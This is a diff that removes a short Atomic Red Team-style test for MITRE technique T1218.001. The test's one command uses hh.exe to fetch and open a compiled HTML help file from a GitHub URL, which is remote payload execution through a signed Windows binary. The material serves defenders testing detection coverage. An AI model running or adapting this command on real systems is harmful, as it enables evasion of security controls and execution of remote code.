@@ -1,7 +1,0 @@
-#TechniqueName: Signed Binary Proxy Execution: Compiled HTML File
-#AtomicTestName: Compiled HTML Help Remote Payload
-#Language: cmd
-
-#commands
-hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
-
